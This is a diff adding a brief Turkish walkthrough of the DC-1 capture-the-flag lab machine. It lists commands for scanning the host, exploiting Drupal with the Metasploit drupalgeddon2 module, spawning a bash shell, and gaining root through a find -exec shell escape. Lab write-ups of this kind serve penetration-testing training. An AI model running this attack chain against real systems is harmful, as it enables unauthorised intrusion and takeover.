@@ -1,0 +1,8 @@
+DC-1 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.120 bulundu.
+2 - nmap -sT -A 192.168.2.120
+3 - gobuster dir -u http://192.168.2.120/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+4 - msfconsole, search drupal, use exploit/unix/webapp/drupal_drupalgeddon2
+5 - which python, python -c 'import pty; pty.spawn("/bin/bash")'
+6 - find . -exec /bin/sh \; -quit
+7 - whoami
